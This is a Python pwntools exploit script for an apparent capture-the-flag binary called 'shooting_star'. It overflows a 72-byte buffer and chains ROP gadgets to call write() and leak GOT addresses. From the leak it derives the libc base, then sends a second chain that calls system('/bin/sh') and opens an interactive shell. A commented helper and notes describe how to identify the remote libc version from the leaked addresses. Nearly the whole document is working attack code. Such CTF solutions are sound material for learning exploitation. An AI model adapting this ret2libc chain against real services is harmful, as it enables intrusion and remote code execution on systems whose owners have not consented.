#!/usr/bin/env python3

from pwn import *

e = ELF("./shooting_star_patched")
libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(star+0xa8)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r

def identify_libc(r):
    rop = ROP(e)
    # No need (and there is no gadget) to set the rdx. It is 0x1a already.
    rop.rsi = e.got.write
    rop.rdi = 1
    rop.raw(e.plt.write)
    rop.rsi = e.got.read
    rop.rdi = 1
    rop.raw(e.plt.write)
    rop.rsi = e.got.setvbuf
    rop.rdi = 1
    rop.raw(e.plt.write)
    payload = flat(
            b'\x90' * 72,
            rop.chain(),
            b'A' * 8,
            )
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'>>', payload)

    r.recvuntil(b'come true!\n')
    write_addr = u64(r.recv(8))
    info(f'the write addr is {hex(write_addr)}')
    r.recv(18)
    read_addr = u64(r.recv(8))
    info(f'the read addr is {hex(read_addr)}')
    r.recv(18) # rest outputs
    setvbuf_addr = u64(r.recv(8))
    info(f'the setvbuf addr is {hex(setvbuf_addr)}')
    r.recv(18) # rest outputs


def main():
    r = conn()

    # New thing learned today: libc identification
    # Use write/puts to leak the libc function address. Then check the https://libc.blukat.me/ or https://libc.rip/ to find the libc version.

    # We can use the following function first to identify the libc version:
    # - libc6_2.27-3ubuntu1.3_amd64
    # - libc6_2.27-3ubuntu1.4_amd64
    # Both have the same offsets.
    # identify_libc(r)

    rop = ROP(e)
    rop.rsi = e.got.write
    rop.rdi = 1
    rop.raw(e.plt.write)
    payload = flat(
            b'\x90' * 72,
            rop.chain(),
            e.sym.star,     # jump back so we can have another chance.
            )
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'>>', payload)
    r.recvuntil(b'come true!\n')
    write_addr = u64(r.recv(8))
    info(f'the write addr is {hex(write_addr)}')
    r.recv(18)

    write_offset = libc.sym.write - libc.address
    libc.address = write_addr - write_offset
    rop = ROP(libc)
    rop.system(next(libc.search(b'/bin/sh')))
    info(f'rop chain for system() is:\n{rop.dump()}')
    payload = flat(
            b'\x90' * 72,
            rop.chain(),
            e.sym.star,     # jump back so we can have another chance.
            )
    r.sendline(b'1')
    r.sendlineafter(b'>>', payload)


    r.interactive()

if __name__ == "__main__":
    main()
